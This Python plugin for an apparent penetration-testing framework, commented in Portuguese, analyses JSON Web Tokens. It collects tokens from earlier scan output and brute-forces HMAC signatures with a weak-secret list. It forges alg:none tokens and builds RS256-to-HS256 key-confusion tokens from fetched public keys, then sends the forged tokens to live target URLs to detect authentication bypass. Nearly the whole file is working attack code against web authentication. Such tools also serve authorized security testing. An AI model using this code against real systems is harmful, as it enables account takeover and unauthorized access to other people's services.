#!/usr/bin/env python3
"""
JWT Analyzer — Coleta, decodifica e testa JWTs
Testa alg:none, chaves HS256 fracas, expiração
Captura raw request/response para Burp modal
"""
from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY
import json
import re
import base64
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_raw_request, format_raw_response

try:
    import httpx
except ImportError:
    httpx = None

# Chaves HS256 comuns para brute-force
WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "key", "test",
    "admin", "default", "jwt_secret", "supersecret", "qwerty",
    "letmein", "abc123", "password1", "your-256-bit-secret",
    "your-secret-key", "my-secret-key", "jwt-secret", "token",
    "secretkey", "s3cr3t", "jwt", "hmac", "auth",
]

JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')

def b64_decode_jwt(segment):
    """Decode a JWT base64url segment"""
    segment += "=" * (4 - len(segment) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(segment))
    except Exception:
        return None


def decode_jwt(token):
    """Decodifica um JWT sem verificação"""
    parts = token.split(".")
    if len(parts) < 2:
        return None, None
    
    header = b64_decode_jwt(parts[0])
    payload = b64_decode_jwt(parts[1])
    return header, payload


def test_alg_none(token):
    """Testa se o servidor aceita alg:none"""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    
    # Criar token com alg:none
    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    none_token = f"{none_header}.{parts[1]}."
    return none_token


def test_weak_secrets(token, alg):
    """Tenta quebrar a assinatura (HS256/384/512) usando hmac local"""
    if alg.upper() not in ["HS256", "HS384", "HS512"]: 
        return None
        
    parts = token.split(".")
    if len(parts) != 3: 
        return None
        
    msg = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = parts[2]
    
    import hmac
    import hashlib
    hash_fn = hashlib.sha256
    if alg.upper() == "HS384": hash_fn = hashlib.sha384
    elif alg.upper() == "HS512": hash_fn = hashlib.sha512
        
    for secret in WEAK_SECRETS:
        sig = hmac.new(secret.encode(), msg, hash_fn).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        if sig_b64 == expected_sig:
            return secret
            
    return None


def check_expiration(payload):
    """Verifica se o JWT está expirado ou sem expiração"""
    issues = []
    
    exp = payload.get("exp")
    if not exp:
        issues.append({"type": "NO_EXPIRATION", "risk": "MEDIUM", "details": "Token sem claim 'exp' — nunca expira"})
    elif isinstance(exp, (int, float)):
        if exp < time.time():
            issues.append({"type": "EXPIRED_TOKEN", "risk": "LOW", "details": f"Token expirado em {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))}"})
        elif exp - time.time() > 86400 * 30:
            days = int((exp - time.time()) / 86400)
            issues.append({"type": "LONG_EXPIRATION", "risk": "MEDIUM", "details": f"Token expira em {days} dias — muito longo"})
    
    iat = payload.get("iat")
    if not iat:
        issues.append({"type": "NO_ISSUED_AT", "risk": "LOW", "details": "Token sem claim 'iat'"})
    
    return issues


def collect_jwts(target):
    """Coleta JWTs de diversas fontes"""
    base = Path("output") / target
    jwts = {}  # token -> source
    
    # 1) Buscar no json de chaves estruturadas para preservar a URL de origem
    keys_file = base / "domain" / "extracted_keys.json"
    if keys_file.exists():
        try:
            keys_data = json.loads(keys_file.read_text(errors="ignore"))
            for k in keys_data:
                match_val = k.get("full_match", k.get("match", ""))
                if "eyJ" in match_val:
                    for m in JWT_REGEX.finditer(match_val):
                        src = k.get("source", {})
                        if isinstance(src, dict) and src.get("url"):
                            jwts[m.group()] = src.get("url")
                        else:
                            jwts[m.group()] = f"file: {keys_file.name}"
        except Exception:
            pass

    # 1.5) Outros jsons/txts
    search_files = [
        base / "domain" / "extracted_js.json",
        base / "domain" / "extracted_routes.json",
    ]
    
    for sf in search_files:
        if sf.exists():
            try:
                content = sf.read_text(errors="ignore")
                for match in JWT_REGEX.finditer(content):
                    if match.group() not in jwts:
                        jwts[match.group()] = f"file: {sf.name}"
            except Exception:
                pass
    
    # 2) Buscar em todos os txt/json do output
    for f in base.rglob("*.txt"):
        try:
            content = f.read_text(errors="ignore")[:100000]
            for match in JWT_REGEX.finditer(content):
                if match.group() not in jwts:
                    jwts[match.group()] = f"file: {f.relative_to(base)}"
        except Exception:
            pass
    
    for f in base.rglob("*.json"):
        try:
            content = f.read_text(errors="ignore")[:100000]
            for match in JWT_REGEX.finditer(content):
                if match.group() not in jwts:
                    jwts[match.group()] = f"file: {f.relative_to(base)}"
        except Exception:
            pass
    
    return jwts


def analyze_jwt(token, source):
    """Analisa um JWT individual"""
    header, payload = decode_jwt(token)
    if not header or not payload:
        return None
    
    findings = []
    
    alg = header.get("alg", "unknown")
    
    # 1) alg:none test
    if alg.lower() == "none":
        findings.append({
            "type": "ALG_NONE",
            "risk": "HIGH", 
            "details": "Token já usa alg:none — potencialmente forjável",
            "token_preview": token[:50] + "...",
            "header": header,
            "payload": payload,
            "source": source,
        })
    
    # 2) Weak algorithm checks & Local Brute Force
    if alg.upper() in ("HS256", "HS384", "HS512"):
        cracked_secret = test_weak_secrets(token, alg)
        
        if cracked_secret:
             findings.append({
                "type": "JWT_SECRET_CRACKED",
                "risk": "CRITICAL",
                "details": f"A assinatura do JWT '{alg}' foi CRACKEADA localmente! Segredo: '{cracked_secret}'",
                "token_preview": token[:50] + "...",
                "header": header,
                "payload": payload,
                "source": source,
                "cracked_secret": cracked_secret
             })
        else:
            findings.append({
                "type": "SYMMETRIC_ALG",
                "risk": "MEDIUM",
                "details": f"Token usa algoritmo simétrico '{alg}' — suscetível a brute-force de chave offline",
                "token_preview": token[:50] + "...",
                "header": header,
                "payload": payload,
                "source": source,
                "alg_none_token": test_alg_none(token),
            })
    
    # 3) Expiration checks
    exp_issues = check_expiration(payload)
    for issue in exp_issues:
        findings.append({
            **issue,
            "token_preview": token[:50] + "...",
            "header": header,
            "payload": payload,
            "source": source,
        })
    
    # 4) Sensitive claims
    sensitive_keys = ["password", "pwd", "secret", "ssn", "credit_card", "private_key"]
    for key in payload:
        if key.lower() in sensitive_keys:
            findings.append({
                "type": "SENSITIVE_CLAIM",
                "risk": "HIGH",
                "details": f"Token contém claim sensível: '{key}'",
                "token_preview": token[:50] + "...",
                "header": header,
                "payload": payload,
                "source": source,
            })
    
    # 5) Admin/role claims
    role = payload.get("role", payload.get("roles", payload.get("admin", None)))
    if role:
        findings.append({
            "type": "ROLE_CLAIM",
            "risk": "MEDIUM",
            "details": f"Token contém claim de role: {role} — teste alteração para admin/root",
            "token_preview": token[:50] + "...",
            "header": header,
            "payload": payload,
            "source": source,
        })
    
    # 6) V11: jku (JWK Set URL) header — permite apontar para chave pública externa
    jku = header.get("jku")
    if jku:
        findings.append({
            "type": "JKU_HEADER_PRESENT",
            "risk": "HIGH",
            "details": f"Token contém header 'jku': {jku} — atacante pode redirecionar para sua própria JWKS URL",
            "token_preview": token[:50] + "...",
            "header": header,
            "payload": payload,
            "source": source,
            "jku_url": jku,
        })
    
    # 7) V11: kid (Key ID) header — pode ser explorado via SQLi ou path traversal
    kid = header.get("kid")
    if kid:
        risk = "MEDIUM"
        details = f"Token contém header 'kid': {kid} — testar SQLi e path traversal no kid"
        # Indicadores de kid vulnerável
        if any(c in str(kid) for c in ["'", "/", "..", "\\"]):
            risk = "HIGH"
            details += " — CARACTERES SUSPEITOS no kid!"
        findings.append({
            "type": "KID_HEADER_PRESENT",
            "risk": risk,
            "details": details,
            "token_preview": token[:50] + "...",
            "header": header,
            "payload": payload,
            "source": source,
            "kid_value": kid,
        })
    
    return findings if findings else None


def test_jwt_on_target(client, url, original_token, none_token):
    """Testa se o target aceita tokens manipulados.
    V10.6: Compara resposta com token vs sem token para evitar FPs em páginas públicas."""
    findings = []
    
    if not none_token:
        return []
    
    # V10.6: Fetch baseline (sem nenhum token) para comparar
    try:
        baseline_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT}, timeout=10)
        baseline_body = baseline_resp.text[:3000]
        baseline_status = baseline_resp.status_code
    except Exception:
        return []
    
    # Testar com alg:none
    for header_name in ["Authorization", "Cookie"]:
        for value in [f"Bearer {none_token}", f"token={none_token}"]:
            try:
                resp = client.get(url, headers={header_name: value, "User-Agent": DEFAULT_USER_AGENT}, timeout=10)
                if resp.status_code == 200:
                    # V10.6: Comparar corpo da resposta com baseline
                    # Se o body é idêntico ao sem token, a página é pública (NÃO é bypass)
                    token_body = resp.text[:3000]
                    
                    import difflib
                    similarity = difflib.SequenceMatcher(None, baseline_body, token_body).ratio()
                    
                    # Só considerar bypass se a resposta COM token for significativamente diferente
                    # (contém dados extras que a baseline não tem)
                    if similarity < 0.90 and len(token_body) > len(baseline_body) * 1.1:
                        raw_req = format_raw_request("GET", url, {**dict(resp.request.headers), header_name: value})
                        raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
                        findings.append({
                            "url": url,
                            "type": "ALG_NONE_ACCEPTED",
                            "risk": "HIGH",
                            "details": f"Servidor aceitou token com alg:none via {header_name} — resposta difere da baseline ({similarity:.0%} similar, +{len(token_body)-len(baseline_body)} bytes)",
                            "request_raw": raw_req,
                            "response_raw": raw_res,
                        })
            except Exception:
                pass
    
    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
        f"   🔑  {C.BOLD}{C.CYAN}JWT ANALYZER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟪───────────────────────────────────────────────────────────🟪\n"
    )

    outdir = ensure_outdir(target, "jwt_analyzer")
    results_file = outdir / "jwt_results.json"
    
    # Coletar JWTs
    info(f"   🔍 Coletando JWTs dos outputs...")
    jwts = collect_jwts(target)
    
    if not jwts:
        info("Nenhum JWT encontrado nos outputs")
        results_file.write_text("[]")
        return [str(results_file)]
    
    info(f"   📊 {len(jwts)} JWTs encontrados")
    
    all_findings = []
    
    # Analisar cada JWT
    for token, source in jwts.items():
        findings = analyze_jwt(token, source)
        if findings:
            all_findings.extend(findings)
            for f in findings:
                info(f"   🚨 {C.YELLOW}{f['type']}: {f['details'][:60]}{C.END}")
    
    # V10.4: Key Confusion Attack (RS256 → HS256)
    info(f"   🔑 {C.CYAN}[V10.4] Testando Key Confusion Attack (RS256→HS256)...{C.END}")
    try:
        import base64
        import hmac
        import hashlib
        
        # Tentar obter chave pública de endpoints comuns
        public_key = None
        key_endpoints = [
            f"https://{target}/.well-known/jwks.json",
            f"https://{target}/.well-known/openid-configuration",
            f"https://{target}/jwks.json",
            f"https://{target}/.well-known/oauth-authorization-server",
        ]
        
        if httpx:
            with httpx.Client(verify=False, timeout=10) as pk_client:
                for ep in key_endpoints:
                    try:
                        resp = pk_client.get(ep)
                        if resp.status_code == 200 and "keys" in resp.text:
                            key_data = resp.json()
                            if "keys" in key_data and key_data["keys"]:
                                # Extrair a primeira chave pública
                                first_key = key_data["keys"][0]
                                key_info = json.dumps(first_key)
                                public_key = key_info
                                all_findings.append({
                                    "type": "JWKS_ENDPOINT_FOUND",
                                    "risk": "INFO",
                                    "details": f"Chave pública encontrada em {ep} — testar Key Confusion (RS256→HS256) com esta chave como secret HMAC",
                                    "endpoint": ep,
                                    "key_preview": key_info[:200],
                                })
                                info(f"   ⚠️ {C.YELLOW}Chave pública encontrada em {ep} — Key Confusion possível{C.END}")
                                break
                    except Exception:
                        pass
        
        # Para cada JWT com RS256, gerar um token HS256 usando a public key como secret
        for token, source in jwts.items():
            parts = token.split(".")
            if len(parts) == 3:
                try:
                    header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    if header.get("alg") in ["RS256", "RS384", "RS512"] and public_key:
                        # Gerar token com alg:HS256 e public key como secret
                        new_header = base64.urlsafe_b64encode(
                            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                        ).decode().rstrip("=")
                        
                        payload_b64 = parts[1]
                        signing_input = f"{new_header}.{payload_b64}"
                        signature = base64.urlsafe_b64encode(
                            hmac.new(public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
                        ).decode().rstrip("=")
                        
                        confused_token = f"{signing_input}.{signature}"
                        
                        all_findings.append({
                            "type": "KEY_CONFUSION_CANDIDATE",
                            "risk": "MEDIUM",
                            "details": "Token HS256 gerado com public key como HMAC secret — PRECISA ser testado contra endpoints autenticados",
                            "original_alg": header.get("alg"),
                            "confused_token_preview": confused_token[:80] + "...",
                            "source": source,
                        })
                        info(f"   🔴 {C.RED}Token Key Confusion gerado (RS256→HS256){C.END}")
                except Exception:
                    pass
    except Exception:
        pass
    
    # Testar tokens com alg:none contra o target (se httpx disponível)
    if httpx and all_findings:
        info(f"   🧪 Testando tokens manipulados contra o target...")
        
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
        if urls_file.exists():
            test_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()][:20]
            
            with httpx.Client(verify=False, timeout=10) as client:
                for finding in all_findings:
                    none_token = finding.get("alg_none_token")
                    if none_token:
                        for url in test_urls[:5]:
                            live_findings = test_jwt_on_target(client, url, finding.get("token_preview", ""), none_token)
                            all_findings.extend(live_findings)
    
    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False, default=str))
    
    if all_findings:
        success(f"🔑 {len(all_findings)} problemas JWT encontrados!")
    else:
        success("✅ Nenhum problema JWT detectado")
    
    return [str(results_file)]
